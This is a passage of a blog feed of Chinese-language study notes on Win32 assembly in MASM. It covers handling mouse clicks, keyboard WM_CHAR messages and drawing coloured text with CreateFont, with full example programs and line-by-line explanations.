<h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </span><br><span class="line"></span><br><span class="line">include \masm32\include\windows.inc </span><br><span class="line">include \masm32\include\user32.inc </span><br><span class="line">include \masm32\include\kernel32.inc </span><br><span class="line">include \masm32\include\gdi32.inc </span><br><span class="line">includelib \masm32\lib\user32.lib </span><br><span class="line">includelib \masm32\lib\kernel32.lib </span><br><span class="line">includelib \masm32\lib\gdi32.lib </span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0 </span><br><span class="line">AppName  db &quot;Our First Window&quot;,0 </span><br><span class="line">MouseClick db 0</span><br><span class="line"></span><br><span class="line">.data? </span><br><span class="line">hInstance HINSTANCE ? </span><br><span class="line">CommandLine LPSTR ? </span><br><span class="line">hitpoint POINT &lt;&gt; </span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line">start: </span><br><span class="line">    invoke GetModuleHandle, NULL </span><br><span class="line">    mov    hInstance,eax </span><br><span class="line">    invoke GetCommandLine</span><br><span class="line">    mov CommandLine,eax </span><br><span class="line">    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT </span><br><span class="line">    invoke ExitProcess,eax </span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInst </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc </span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </span><br><span class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </span><br><span class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </span><br><span class="line">           hInst,NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </span><br><span class="line">    invoke UpdateWindow, hwnd </span><br><span class="line">    .WHILE TRUE </span><br><span class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">                .BREAK .IF (!eax) </span><br><span class="line">                invoke DispatchMessage, ADDR msg </span><br><span class="line">    .ENDW </span><br><span class="line">    mov     eax,msg.wParam </span><br><span class="line">    ret </span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </span><br><span class="line">    LOCAL hdc:HDC </span><br><span class="line">    LOCAL ps:PAINTSTRUCT </span><br><span class="line"></span><br><span class="line">    .IF uMsg==WM_DESTROY </span><br><span class="line">        invoke PostQuitMessage,NULL </span><br><span class="line">    .ELSEIF uMsg==WM_LBUTTONDOWN </span><br><span class="line">        mov eax,lParam </span><br><span class="line">        and eax,0FFFFh </span><br><span class="line">        mov hitpoint.x,eax </span><br><span class="line">        mov eax,lParam </span><br><span class="line">        shr eax,16 </span><br><span class="line">        mov hitpoint.y,eax </span><br><span class="line">        mov MouseClick,TRUE </span><br><span class="line">        invoke InvalidateRect,hWnd,NULL,TRUE </span><br><span class="line">    .ELSEIF uMsg==WM_PAINT </span><br><span class="line">        invoke BeginPaint,hWnd, ADDR ps </span><br><span class="line">        mov    hdc,eax </span><br><span class="line">        .IF MouseClick </span><br><span class="line">            invoke lstrlen,ADDR AppName </span><br><span class="line">            invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax </span><br><span class="line">        .ENDIF </span><br><span class="line">        invoke EndPaint,hWnd, ADDR ps </span><br><span class="line">    .ELSE </span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam </span><br><span class="line">        ret </span><br><span class="line">    .ENDIF </span><br><span class="line">    xor    eax,eax </span><br><span class="line">    ret </span><br><span class="line">WndProc endp </span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.ELSEIF uMsg==WM_LBUTTONDOWN </span><br><span class="line">    mov eax,lParam </span><br><span class="line">    and eax,0FFFFh </span><br><span class="line">    mov hitpoint.x,eax </span><br><span class="line">    mov eax,lParam </span><br><span class="line">    shr eax,16 </span><br><span class="line">    mov hitpoint.y,eax </span><br><span class="line">    mov MouseClick,TRUE </span><br><span class="line">    invoke InvalidateRect,hWnd,NULL,TRUE</span><br></pre></td></tr></table></figure>
<p>窗口过程处理了<code>WM_LBUTTONDOWN</code>消息，当接收到该消息时，<code>lParam</code>中包含了相对于窗口客户区左上角的坐标，我们把它保存下来，放到一个结构体变量（POINT）中，该结构体变量的定义如下： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POINT STRUCT </span><br><span class="line">    x   dd ? </span><br><span class="line">    y   dd ? </span><br><span class="line">POINT ENDS</span><br></pre></td></tr></table></figure>
<p>然后我们把标志量<code>MouseClick</code>设为<code>TRUE</code>，这表明至少有一次在客户区的左键按下消息。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax,lParam </span><br><span class="line">and eax,0FFFFh </span><br><span class="line">mov hitpoint.x,eax</span><br></pre></td></tr></table></figure>
<p>由于<code>lParam</code>是一个32位长的数，其中高、低16位分别包括了y、x坐标所以我们做一些小处理，以便保存它们。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shr eax,16 </span><br><span class="line">mov hitpoint.y,eax</span><br></pre></td></tr></table></figure>
<p>保存完坐标后我们设标志<code>MouseClick</code>为<code>TRUE</code>，这是在处理<code>WM_PAINT</code>时用来判断是否有鼠标左键按下消息。然后我们调用<code>InvalidateRect</code>函数迫使WINDOWS重新绘制客户区。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.IF MouseClick </span><br><span class="line">    invoke lstrlen,ADDR AppName </span><br><span class="line">    invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax </span><br><span class="line">.ENDIF</span><br></pre></td></tr></table></figure>
<p>绘制客户区的代码首先检测<code>MouseClick</code>标志位，再决定是否重绘。因为我们在首次显示窗口时还没有左键按下的消息，所以我们在初始时把该标志设为<code>FALSE</code>，告诉WINDOWS不要重绘客户区，当有左键按下的消息时，它会在鼠标按下的位置绘制字符串。注意在调用<code>TextOut</code>函数时，其关于字符串长度的参数是调用<code>lstrlen</code>函数来计算的。</p>
]]></content>
      <categories>
        <category>汇编(ASM)</category>
      </categories>
      <tags>
        <tag>ASM</tag>
        <tag>读书笔记</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32汇编学习(6)：键盘输入消息</title>
    <url>/2018/02/08/Win32ASM6-Keyboard-input-msg.html</url>
    <content><![CDATA[<p>这次，我们将要学习WINDOWS程序是如何处理键盘消息的。<br><a id="more"></a></p>
<h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>因为大多数的PC只有一个键盘，所以所有运行中的WINDOWS程序必须共用它。<strong>WINDOWS 将负责把击键消息送到具有输入焦点的那个应用程序中去</strong>。尽管屏幕上可能同时有几个应用程序窗口，但一个时刻仅有一个窗口有输入焦点。有输入焦点的那个应用程序的标题条总是高亮度显示的。 实际上您可以从两个角度来看键盘消息：一是您可以把它看成是一大堆的按键消息的集合，在这种情况下，当您按下一个键时，WINDOWS就会发送一个 <code>WM_KEYDOWN</code> 给有输入焦点的那个应用程序，提醒它有一个键被按下。当您释放键时，WINDOWS又会发送一个 <code>WM_KYEUP</code> 消息，告诉有一个键被释放。您把每一个键当成是一个按钮；另一种情况是：您可以把键盘看成是字符输入设备。当您按下“a”键时，WINDOWS发送一个 <code>WM_CHAR</code> 消息给有输入焦点的应用程序，告诉它“a”键被按下。实际上WINDOWS 内部发送 <code>WM_KEYDOWN</code> 和 <code>WM_KEYUP</code> 消息给有输入焦点的应用程序，而这些消息将通过调用 <code>TranslateMessage</code> 翻译成 <code>WM_CHAR</code> 消息。WINDOWS窗口过程函数将决定是否处理所收到的消息，一般说来您不大会去处理 <code>WM_KEYDOWN</code> 、 <code>WM_KEYUP</code> 消息，在消息循环中 <code>TranslateMessage</code> 函数会把上述消息转换成 <code>WM_CHAR</code> 消息。这次学习中将只处理 <code>WM_CHAR</code>。 </p>
<h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">include gdi32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line">includelib gdi32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0</span><br><span class="line">AppName   db &quot;Our Fourth Window&quot;,0</span><br><span class="line">char WPARAM 20h</span><br><span class="line"></span><br><span class="line">.data?</span><br><span class="line">hInstance HINSTANCE ?</span><br><span class="line">CommandLine LPSTR ?</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">invoke GetModuleHandle,NULL</span><br><span class="line">mov    hInstance,eax</span><br><span class="line">invoke GetCommandLine</span><br><span class="line">mov    CommandLine,eax</span><br><span class="line">invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT</span><br><span class="line">invoke ExitProcess,eax</span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD</span><br><span class="line">    </span><br><span class="line">    LOCAL wc:WNDCLASSEX</span><br><span class="line">    LOCAL msg:MSG</span><br><span class="line">    LOCAL hwnd:HWND</span><br><span class="line">    mov wc.cbSize,SIZEOF WNDCLASSEX</span><br><span class="line">    mov wc.style,CS_HREDRAW or CS_VREDRAW</span><br><span class="line">    mov wc.lpfnWndProc,OFFSET WndProc</span><br><span class="line">    mov wc.cbClsExtra,NULL</span><br><span class="line">    mov wc.cbWndExtra,NULL</span><br><span class="line">    push hInst</span><br><span class="line">    pop wc.hInstance</span><br><span class="line">    mov wc.hbrBackground,COLOR_WINDOW+1</span><br><span class="line">    mov wc.lpszMenuName,NULL</span><br><span class="line">    mov wc.lpszClassName,OFFSET ClassName</span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION</span><br><span class="line">    mov wc.hIcon,eax</span><br><span class="line">    mov wc.hIconSm,eax</span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW</span><br><span class="line">    mov wc.hCursor,eax</span><br><span class="line">    invoke RegisterClassEx,ADDR wc</span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\</span><br><span class="line">                        WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,\</span><br><span class="line">                        CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,hInst,NULL</span><br><span class="line">    mov hwnd,eax</span><br><span class="line">    invoke ShowWindow,hwnd,SW_SHOWNORMAL</span><br><span class="line">    invoke UpdateWindow,hwnd</span><br><span class="line">    .while TRUE</span><br><span class="line">        invoke GetMessage,ADDR msg,NULL,0,0</span><br><span class="line">        .break .if (!eax)</span><br><span class="line">        invoke TranslateMessage,ADDR msg</span><br><span class="line">        invoke DispatchMessage,ADDR msg</span><br><span class="line">    .endw</span><br><span class="line">    mov eax,msg.wParam</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM</span><br><span class="line">    </span><br><span class="line">    LOCAL hdc:HDC</span><br><span class="line">    LOCAL ps:PAINTSTRUCT</span><br><span class="line">    </span><br><span class="line">    .if uMsg==WM_DESTROY</span><br><span class="line">        invoke PostQuitMessage,NULL</span><br><span class="line">    .elseif uMsg==WM_CHAR</span><br><span class="line">        push wParam</span><br><span class="line">        pop  char</span><br><span class="line">        invoke InvalidateRect,hWnd,NULL,TRUE</span><br><span class="line">    .elseif uMsg==WM_PAINT</span><br><span class="line">        invoke BeginPaint,hWnd,ADDR ps</span><br><span class="line">        mov    hdc,eax</span><br><span class="line">        invoke TextOut,hdc,0,0,ADDR char,1</span><br><span class="line">        invoke EndPaint,hWnd,ADDR ps</span><br><span class="line">    .else</span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam</span><br><span class="line">        ret</span><br><span class="line">    .endif</span><br><span class="line">    xor eax,eax</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">WndProc endp</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char WPARAM 20h</span><br></pre></td></tr></table></figure>
<p>这个变量将保存从键盘接收到的字符。因为它是在窗口过程中通过WPARAM型变量传送的，所以我们简单地把它定义为WPARAM型。<strong>由于我们的窗口在初次刷新时(也即刚被创建的那一次)是没有键盘输入的所以我们把他设成空格符（20h），这样显示时您就什么都看不见。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.ELSEIF uMsg==WM_CHAR </span><br><span class="line">    push wParam </span><br><span class="line">    pop  char </span><br><span class="line">    invoke InvalidateRect, hWnd,NULL,TRUE</span><br></pre></td></tr></table></figure>
<p>这一段是用来处理<code>WM_CHAR</code>消息的。它把接收到的字符放入变量<code>char</code>中，接着调用<code>InvalidateRect</code>，而InvalidateRect使得窗口的客户区无效，这样它会发出WM_PAINT消息，而WM_PAINT消息迫使WINDOWS重新绘制它的客户区。该函数的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">InvalidateRect proto hWnd:HWND, lpRect:DWORD, bErase:DWORD</span><br></pre></td></tr></table></figure>
<p><code>lpRect</code>是指向客户区我们想要其无效的一个正方形结构体的指针。如果该值等于<code>NULL</code>，则整个客户区都无效；布尔值<code>bErase</code>告诉WINDOWS是否擦除背景，如果是TRUE，则WINDOWS在调用BeginPaint函数时把背景擦掉。 所以我们此处的做法是：<strong>我们将保存所有有关重绘客户区的数据，然后发送<code>WM_PAINT</code>消息(通过<code>InvalidateRect</code>)，处理该消息的程序段然后根据相关数据重新绘制客户区。实际上我们完全可以通过调用 <code>GetDC</code> 获得设备上下文句柄，然后绘制字符，然后再调用<code>ReleaseDC</code>释放设备上下文句柄，毫无疑问这样也能在客户区绘制出正确的字符。但是如果这之后接收到<code>WM_PAINT</code>消息要处理时，客户区会重新刷新，而我们这稍前所绘制的字符就会消失掉。所以为了让字符一直正确地显示，就必须把它们放到<code>WM_PAINT</code>的处理过程中处理。而在本消息处理中发送<code>WM_PAINT</code>消息即可。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">invoke TextOut,hdc,0,0,ADDR char,1</span><br></pre></td></tr></table></figure>
<p><strong>在调用<code>InvalidateRect</code>时，<code>WM_PAINT</code>消息被发送到了WINDOWS窗口处理过程，程序流程转移到处理<code>WM_PAINT</code>消息的程序段</strong>，然后调用<code>BeginPaint</code>得到设备上下文的句柄，再调用<code>TextOut</code>在客户区的（0，0）处输出保存的按键字符。这样无论您按什么键都能在客户区的左上角显示，不仅如此，无论您怎么缩放窗口（迫使WINDOWS重新绘制它的客户区），字符都会在正确的地方显示，所以<strong>必须把所有重要的绘制动作都放到处理<code>WM_PAINT</code>消息的程序段中去</strong>。</p>
]]></content>
      <categories>
        <category>汇编(ASM)</category>
      </categories>
      <tags>
        <tag>ASM</tag>
        <tag>读书笔记</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32汇编学习(5)：绘制文本2</title>
    <url>/2018/02/08/Win32-ASM-5-draw-text.html</url>
    <content><![CDATA[<p>这次我们将学习有关文本的诸多属性如字体和颜色等。<br><a id="more"></a></p>
<h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>Windows 的颜色系统是用RGB值来表示的，R 代表红色，G 代表绿色，B 代表蓝色。如果您想指定一种颜色就必须给该颜色赋相关的 RGB 值，RGB 的取值范围都是从 0 到 255，譬如您想要得到纯红色，就必须对RGB赋值（255，0，0），纯白色是 （255，255，255）。</p>
<p>您可以用函数 <code>SetTextColor</code> 和 <code>SetBkColor</code> 来“绘制”字符颜色和背景色，但是必须传递一个“设备环境”的句柄和 RGB 值作为参数。RGB 的结构体的定义如下： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RGB_value struct</span><br><span class="line">unused db 0</span><br><span class="line">blue db ?</span><br><span class="line">green db ?</span><br><span class="line">red db ?</span><br><span class="line">RGB_value ends</span><br></pre></td></tr></table></figure>
<p>其中第一字节为 0 而且始终为 0，其它三个字节分别表示蓝色、绿色和红色，刚好和 RGB 的次序相反。这个结构体用起来挺别扭，所以我们重新定义一个宏用它来代替。该宏接收红绿蓝三个参数，并在 eax 寄存器中返回 32 位的 RGB 值，宏的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RGB macro red，green，blue</span><br><span class="line">xor eax，eax</span><br><span class="line">mov ah，blue</span><br><span class="line">shl eax，8</span><br><span class="line">mov ah，green</span><br><span class="line">mov al，red</span><br><span class="line">endm</span><br></pre></td></tr></table></figure>
<p>您可以把该宏放到头文件中以方便使用。 </p>
<p>您可以调用 <code>CreateFont</code> 和 <code>CreateFontIndirect</code> 来创建自己的字体，这两个函数的差别是：前者要求您传递一系列的参数，而后者只要传递一个指向 <code>LOGFONT</code> 结构的指针。这样就使得后者使用起来更方便，尤其当您需要频繁创建字体时。在我们的例子中由于只要创建一种字体，故用 <code>CreateFont</code> 就足够了。在调用该函数后会返回所创建的字体的句柄，然后把该句柄选进“设备环境”使其成为当前字体，随后所有的“绘制”文本串的函数在被调用时都要把该句柄作为一个参数传递 </p>
<h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">include kernel32.inc</span><br><span class="line">includelib kernel32.lib</span><br><span class="line">include gdi32.inc</span><br><span class="line">includelib gdi32.lib</span><br><span class="line"></span><br><span class="line">RGB macro red,green,blue</span><br><span class="line">	xor eax,eax</span><br><span class="line">	mov ah,blue</span><br><span class="line">	shl eax,8</span><br><span class="line">	mov ah,green</span><br><span class="line">	mov al,red</span><br><span class="line">endm</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0</span><br><span class="line">AppName   db &quot;Our Third Window&quot;,0</span><br><span class="line">TestString db &quot;Win32 汇编非常有意思&quot;,0</span><br><span class="line">FontName db &quot;script&quot;,0</span><br><span class="line"></span><br><span class="line">.data?</span><br><span class="line">hInstance HINSTANCE ?</span><br><span class="line">CommandLine LPSTR ?</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">	invoke GetModuleHandle,NULL</span><br><span class="line">	mov    hInstance,eax</span><br><span class="line">	invoke GetCommandLine</span><br><span class="line">	mov    CommandLine,eax</span><br><span class="line">	invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT</span><br><span class="line">	invoke ExitProcess,eax</span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInst </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc </span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </span><br><span class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </span><br><span class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </span><br><span class="line">           hInst,NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </span><br><span class="line">    invoke UpdateWindow, hwnd </span><br><span class="line">    .WHILE TRUE </span><br><span class="line">        invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">        .BREAK .IF (!eax) </span><br><span class="line">        invoke TranslateMessage, ADDR msg </span><br><span class="line">        invoke DispatchMessage, ADDR msg </span><br><span class="line">    .ENDW </span><br><span class="line">    mov     eax,msg.wParam </span><br><span class="line">    ret </span><br><span class="line">WinMain endp</span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM</span><br><span class="line">    </span><br><span class="line">    LOCAL hdc:HDC</span><br><span class="line">    LOCAL ps:PAINTSTRUCT</span><br><span class="line">    LOCAL hfont:HFONT</span><br><span class="line">    </span><br><span class="line">    .IF uMsg==WM_DESTROY</span><br><span class="line">        invoke PostQuitMessage,NULL</span><br><span class="line">    .ELSEIF uMsg==WM_PAINT</span><br><span class="line">        invoke BeginPaint,hWnd,ADDR ps</span><br><span class="line">        mov    hdc,eax</span><br><span class="line">        invoke CreateFont,24,16,0,0,400,0,0,0,OEM_CHARSET,\</span><br><span class="line">                            OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,\</span><br><span class="line">                            DEFAULT_QUALITY,DEFAULT_PITCH or FF_SCRIPT,\</span><br><span class="line">                            ADDR FontName </span><br><span class="line">        invoke SelectObject,hdc,eax</span><br><span class="line">        mov    hfont,eax</span><br><span class="line">        RGB    200,200,50</span><br><span class="line">        invoke SetTextColor,hdc,eax</span><br><span class="line">        RGB    0,0,255</span><br><span class="line">        invoke SetBkColor,hdc,eax</span><br><span class="line">        invoke TextOut,hdc,0,0,ADDR TestString,SIZEOF TestString</span><br><span class="line">        invoke SelectObject,hdc,hfont</span><br><span class="line">        invoke EndPaint,hWnd,ADDR ps</span><br><span class="line">    .ELSE</span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam</span><br><span class="line">        ret</span><br><span class="line">    .endif</span><br><span class="line">    xor eax,eax</span><br><span class="line">    ret</span><br><span class="line">WndProc endp</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p><code>CreateFont</code> 函数产生一种逻辑字体，它尽可能地接近参数中指定的各相关值。这个函数大概是所有 Windows API 函数中所带参数最多的一个。它返回一个指向逻辑字体的句柄供调用 <code>SelectObject</code> 函数使用。下面我们详细讲解该函数的参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CreateFont proto \</span><br><span class="line">nHeight：DWORD，\</span><br><span class="line">nWidth：DWORD，\</span><br><span class="line">nEscapement：DWORD，\</span><br><span class="line">nOrientation：DWORD，\</span><br><span class="line">nWeight：DWORD，\ </span><br><span class="line">cItalic：DWORD，\ </span><br><span class="line">cUnderline：DWORD，\</span><br><span class="line">cStrikeOut：DWORD，\</span><br><span class="line">cCharSet：DWORD，\</span><br><span class="line">cOutputPrecision：DWORD，\</span><br><span class="line">cClipPrecision：DWORD，\</span><br><span class="line">cQuality：DWORD，\</span><br><span class="line">cPitchAndFamily：DWORD，\</span><br><span class="line">lpFacename：DWORD</span><br></pre></td></tr></table></figure>
<ul>
<li><code>nHeight</code>： 希望使用的字体的高度，0为缺省。</li>
<li><code>nWidth</code>： 希望使用的字体的宽度，一般情况下最好用0， 这样 Windows 将会自动为您选择一个和高度匹配的值。因为在我们的例子中那样做的话会使得字符因太小而无法显示，所以我们设定它为16。</li>
<li><code>nEscapement</code>： 每一个字符相对前一个字符的旋转角度，一般设成0。900代表转90度，1800转190度，2700转270度。</li>
<li><code>nOrientation</code>： 字体的方向。</li>
<li><code>nWeight</code>： 字体笔画的粗细。</li>
</ul>
<p>Windows 为我们预定义了如下值： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FW_DONTCARE 等于 0</span><br><span class="line">FW_THIN 等于 100</span><br><span class="line">FW_EXTRALIGHT 等于 200</span><br><span class="line">FW_ULTRALIGHT 等于 200</span><br><span class="line">FW_LIGHT 等于 300</span><br><span class="line">FW_NORMAL 等于 400</span><br><span class="line">FW_REGULAR 等于 400</span><br><span class="line">FW_MEDIUM 等于 500</span><br><span class="line">FW_SEMIBOLD 等于 600</span><br><span class="line">FW_DEMIBOLD 等于 600</span><br><span class="line">FW_BOLD 等于 700</span><br><span class="line">FW_EXTRABOLD 等于 800</span><br><span class="line">FW_ULTRABOLD 等于 800</span><br><span class="line">FW_HEAVY 等于 900</span><br><span class="line">FW_BLACK 等于 900</span><br></pre></td></tr></table></figure>
<ul>
<li><code>cItalic</code>： 0为正常，其它值为斜体。 </li>
<li><code>cUnderline</code>： 0为正常，其它值为有下划线。</li>
<li><code>cStrikeOut</code>： 0为正常，其它值为删除线。</li>
<li><code>cCharSet</code>： 字体的字符集。一般选择OEM_CHARSET，它使得 Windows 会选用和操作系统相关的字符集。</li>
<li><code>cOutputPrecision</code>： 指定我们选择的字体接近真实字体的精度。 一般选用OUT_DEFAULT_PRECIS，它决定了缺省的映射方式。</li>
<li><code>cClipPrecision</code>： 指定我们选择的字体在超出裁剪区域时的裁剪精度。 一般选用CLIP_DEFAULT_PRECIS，它决定了裁剪精度。</li>
<li><code>cQuality</code>： 指定输出字体的质量。它指出GDI应如何尽可能的接近真实 字体，一共有三种方式：DEFAULT_QUALITY， PROOF_QUALITY 和DRAFT_QUALITY。</li>
<li><code>cPitchAndFamily</code>：字型和字体家族。</li>
<li><code>lpFacename</code>： 指定字体的名称。 </li>
</ul>
<p>上面的描述不一定好理解，您如果要的到更多的信息，应参考 WIN32 API 指南。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">invoke SelectObject， hdc， eax</span><br><span class="line">mov hfont，eax</span><br></pre></td></tr></table></figure>
<p>在我们得到了指向逻辑字体的句柄后必须调用 <code>SelectObject</code> 函数把它选择进“设备环境”，我们还可以调用该函数把诸如此类的像颜色、笔、画刷 等GDI对象选进“设备环境”。该函数会返回一个旧的“设备环境”的句柄。您必须保存该句柄，以便在完成“绘制”工作后再把它选回。在调用 <code>SelectObject</code> 函数后一切的绘制函数都是针对该“设备环境”的。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RGB 200，200，50</span><br><span class="line">invoke SetTextColor，hdc，eax</span><br><span class="line">RGB 0，0，255 </span><br><span class="line">invoke SetBkColor，hdc，eax</span><br></pre></td></tr></table></figure>
<p>我们用宏 RGB 产生颜色，然后分别调用 <code>SetTextColor</code> 和 <code>SetBkColor</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">invoke TextOut，hdc，0，0，ADDR TestString，SIZEOF TestString</span><br></pre></td></tr></table></figure>
<p>我们调用 <code>TextOut</code> 在客户区用我们前面选定的字体和颜色“绘制”文本串。 <code>TextOut,hdc,x,y,lpString,nCount</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">invoke SelectObject，hdc， hfont</span><br></pre></td></tr></table></figure>
<p>在我们“绘制”完成后，必须恢复“设备环境”。</p>
